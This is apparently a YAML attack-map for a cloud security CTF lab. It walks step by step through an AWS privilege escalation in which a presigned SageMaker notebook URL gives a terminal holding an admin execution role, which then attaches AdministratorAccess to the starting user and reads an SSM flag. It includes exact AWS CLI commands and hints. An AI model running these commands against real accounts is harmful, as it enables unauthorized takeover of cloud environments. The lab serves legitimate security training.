attackMap:
  nodes:
    - id: starting-principal
      label: "Starting User"
      type: principal
      subType: iam-user
      arn: "arn:aws:iam::{account_id}:user/pl-prod-sagemaker-004-to-admin-starting-user"
      access:
        type: assumed-breach-credentials
      description: >
        You have gained access to this principal's AWS IAM credentials. These could
        have been obtained through many real-world vectors: phishing a developer and
        gaining access to their workstation, compromising a browser session, exploiting
        a vulnerable workload running in this AWS account, discovering credentials in
        a public S3 bucket, or finding them hardcoded in source code or a CI/CD pipeline.

        Regardless of how you obtained them, you are now operating as this principal.
        This IAM user has sagemaker:CreatePresignedNotebookInstanceUrl permission on
        the existing notebook instance pl-prod-sagemaker-004-to-admin-notebook, which
        has an administrative execution role attached.

    - id: notebook-instance
      label: "SageMaker Notebook"
      type: resource
      subType: sagemaker-notebook
      arn: "arn:aws:sagemaker:{region}:{account_id}:notebook-instance/pl-prod-sagemaker-004-to-admin-notebook"
      description: >
        This pre-existing SageMaker notebook instance has an administrative IAM execution
        role attached. When accessed via a presigned URL, the Jupyter terminal runs AWS CLI
        commands with the permissions of that execution role, effectively granting admin access
        to anyone who can generate and open a presigned URL for this notebook.

    - id: target-role
      label: "Admin Notebook Role"
      type: principal
      subType: iam-role
      isAdmin: true
      arn: "arn:aws:iam::{account_id}:role/pl-prod-sagemaker-004-to-admin-notebook-role"
      description: >
        This IAM role is attached as the execution role of the SageMaker notebook instance.
        It has AdministratorAccess, meaning any code or terminal command run inside the notebook
        operates with full administrative privileges in the AWS account.

    - id: ctf-flag
      label: "CTF Flag"
      type: resource
      subType: ssm-parameter
      isTarget: true
      arn: "arn:aws:ssm:{region}:{account_id}:parameter/pathfinding-labs/flags/sagemaker-004-to-admin"
      description: >
        The CTF flag stored in AWS Systems Manager Parameter Store. Reading this parameter
        proves end-to-end exploitation of the privilege escalation path. The AdministratorAccess
        policy attached to the starting user during the attack grants the ssm:GetParameter
        permission needed to retrieve it.

  edges:
    - from: starting-principal
      to: notebook-instance
      label: "sagemaker:CreatePresignedNotebookInstanceUrl"
      description: >
        Generate a presigned URL for the existing notebook instance. Opening this URL in
        a browser grants access to the Jupyter interface, which runs with the notebook's
        execution role permissions.
      hints:
        - "The notebook must be in InService state before you can generate a presigned URL -- start it first if it is Stopped. Generate the URL with sagemaker:CreatePresignedNotebookInstanceUrl, then open it in a browser to access the notebook with the instance's admin execution role credentials."
        - "Open a terminal inside Jupyter via New -> Terminal. The terminal runs with the notebook's execution role credentials -- use it to run iam:AttachUserPolicy and grant AdministratorAccess to your starting user before closing the session."
        - "Browse to https://pathfinding.cloud/paths/sagemaker-004 for technique details."
      commands:
        - description: "List notebook instances to find your target"
          command: "aws sagemaker list-notebook-instances --output table"
        - description: "Describe the target notebook and note the execution role ARN"
          command: "aws sagemaker describe-notebook-instance --notebook-instance-name pl-prod-sagemaker-004-to-admin-notebook --output json"
        - description: "Start the notebook if it is in Stopped state"
          command: "aws sagemaker start-notebook-instance --notebook-instance-name pl-prod-sagemaker-004-to-admin-notebook"
        - description: "Generate a presigned URL for the notebook instance"
          command: "aws sagemaker create-presigned-notebook-instance-url --notebook-instance-name pl-prod-sagemaker-004-to-admin-notebook --query 'AuthorizedUrl' --output text"

    - from: notebook-instance
      to: target-role
      label: "Assumes Execution Role"
      description: >
        The notebook instance automatically assumes its attached execution role. Any terminal
        session opened inside the Jupyter interface inherits these administrative permissions,
        allowing the attacker to run arbitrary AWS CLI commands as admin.
      hints: []
      commands:
        - description: "Verify identity from within the notebook terminal (confirms admin role)"
          command: "aws sts get-caller-identity"
        - description: "Grant AdministratorAccess to the starting user from the notebook terminal"
          command: "aws iam attach-user-policy --user-name pl-prod-sagemaker-004-to-admin-starting-user --policy-arn arn:aws:iam::aws:policy/AdministratorAccess"
        - description: "Verify administrative access by listing IAM users (run from original terminal after propagation)"
          command: "aws iam list-users --max-items 3 --output table"

    - from: target-role
      to: ctf-flag
      label: "Read CTF flag"
      description: >
        Use the administrative access now granted to the starting user to read the CTF flag
        from AWS Systems Manager Parameter Store. The AdministratorAccess policy implicitly
        grants ssm:GetParameter on this parameter.
      hints:
        - "Use ssm:GetParameter with the full parameter name to retrieve the flag value."
      commands:
        - description: "Read the CTF flag from SSM Parameter Store"
          command: "aws ssm get-parameter --name /pathfinding-labs/flags/sagemaker-004-to-admin --query 'Parameter.Value' --output text"
